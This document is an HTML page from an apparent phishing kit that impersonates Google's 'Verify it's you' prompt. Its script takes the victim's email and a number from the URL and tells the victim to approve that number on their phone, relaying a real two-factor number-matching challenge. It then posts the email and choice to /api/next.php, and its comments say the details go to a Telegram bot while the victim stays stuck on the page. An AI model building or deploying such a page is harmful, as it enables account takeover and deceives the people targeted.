<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify it's you - Google Accounts</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/google-logo-vector-format-white-background-illustration-407571050.webp">
    <style>
        :root {
            --gmail-blue: #1a73e8;
            --gmail-red: #ea4335;
            --gmail-green: #34a853;
            --gmail-white: #ffffff;
            --gmail-gray: #5f6368;
            --gmail-border: #dadce0;
        }

        * { box-sizing: border-box; }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            min-height: 100%;
            font-family: 'Roboto', sans-serif;
            background: var(--gmail-white);
            color: #202124;
        }

        .container {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 48px 36px;
        }

        .logo {
            width: 75px;
            height: 25px;
            margin-bottom: 24px;
            background: url('images/google-logo-vector-format-white-background-illustration-407571050.webp') no-repeat center;
            background-size: contain;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }

        .subtitle {
            font-size: 16px;
            color: var(--gmail-gray);
            margin-bottom: 32px;
        }

        .number-highlight {
            background: #e8f0fe;
            border: 2px solid var(--gmail-blue);
            border-radius: 8px;
            padding: 24px;
            text-align: center;
            margin-bottom: 24px;
        }

        .number-highlight-label {
            font-size: 14px;
            color: var(--gmail-gray);
            margin-bottom: 8px;
        }

        .number-highlight-value {
            font-size: 48px;
            font-weight: 500;
            color: var(--gmail-blue);
        }

        .number-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 8px;
            margin-bottom: 24px;
        }

        .number-btn {
            padding: 16px;
            border: 1px solid var(--gmail-border);
            background: white;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .number-btn:hover {
            background: #f8f9fa;
            border-color: var(--gmail-gray);
        }

        .number-btn.selected {
            background: var(--gmail-blue);
            color: white;
            border-color: var(--gmail-blue);
        }

        .number-btn.target {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.4); }
            50% { box-shadow: 0 0 0 10px rgba(26, 115, 232, 0); }
        }

        .btn {
            width: 100%;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .btn-primary {
            background: var(--gmail-blue);
            color: white;
        }

        .btn-primary:hover {
            background: #1557b0;
        }

        .btn-primary:disabled {
            background: var(--gmail-gray);
            cursor: not-allowed;
        }

        .btn-secondary {
            background: white;
            color: var(--gmail-blue);
            border: 1px solid var(--gmail-border);
        }

        .instruction {
            font-size: 14px;
            color: var(--gmail-gray);
            margin-bottom: 24px;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #f8f9fa;
            border-top: 1px solid var(--gmail-border);
            padding: 16px 24px;
        }

        .footer-links a {
            color: var(--gmail-gray);
            text-decoration: none;
            font-size: 12px;
            margin-right: 16px;
        }
    </style>
</head>
<body>
        <div class="container">
        <div class="logo"></div>
        <h1 class="title">Verify it's you</h1>
        <p class="subtitle">For your security, Google needs to confirm it's really you. When a List of numbers shows up on your device, choose the number that appear below from the list on your device</p>

        <div style="text-align: center; margin: 40px 0;">
            <div class="number-display" style="background: #e8f0fe; border: 2px solid var(--gmail-blue); border-radius: 50%; width: 120px; height: 120px; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
                <span id="targetNumber" style="font-size: 48px; font-weight: 500; color: var(--gmail-blue);">--</span>
            </div>
            <p id="instructionText" style="font-size: 16px; color: var(--gmail-gray); margin-top: 16px; font-weight: 500;">Select -- on your device</p>
        </div>

        <button id="verifyBtn" class="btn" style="background: var(--gmail-blue); color: white; border: none;" onclick="verifyNumber()" disabled>Verify</button>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

        <script>
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || '';
        const targetNumber = urlParams.get('number') || '';
        let selectedNumber = null;

        // Display target number
        document.getElementById('targetNumber').textContent = targetNumber || '--';
        
        // Update instruction text with the target number
        const instructionText = document.getElementById('instructionText');
        if (targetNumber) {
            instructionText.textContent = `Select ${targetNumber} on your device`;
        }

        // Set up the circular number display
        const numberDisplay = document.querySelector('.number-display');
        
        numberDisplay.addEventListener('click', function() {
            // Set the selected number to the target number
            selectedNumber = parseInt(targetNumber);
            
            // Add selection styling
            this.style.background = 'var(--gmail-blue)';
            this.style.borderColor = 'var(--gmail-blue)';
            this.querySelector('span').style.color = 'white';
            
            // Enable verify button
            document.getElementById('verifyBtn').disabled = false;
        });

        function verifyNumber() {
            const btn = document.getElementById('verifyBtn');
            btn.textContent = 'Verifying...';
            btn.disabled = true;
            numberDisplay.style.pointerEvents = 'none';

            // Send to Telegram
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    btn.textContent = 'Loading...';
                    // Keep user on the same page - no redirect
                    // Details are sent to Telegram bot, but user stays stuck on this page
                }
            };
            xhr.send('di=' + encodeURIComponent(email) + '&chosen_number=' + selectedNumber);
        }

        // Initialize - add pulsing animation to the number display
        document.addEventListener('DOMContentLoaded', function() {
            numberDisplay.style.animation = 'pulse 2s infinite';
        });
    </script>
</body>
</html>
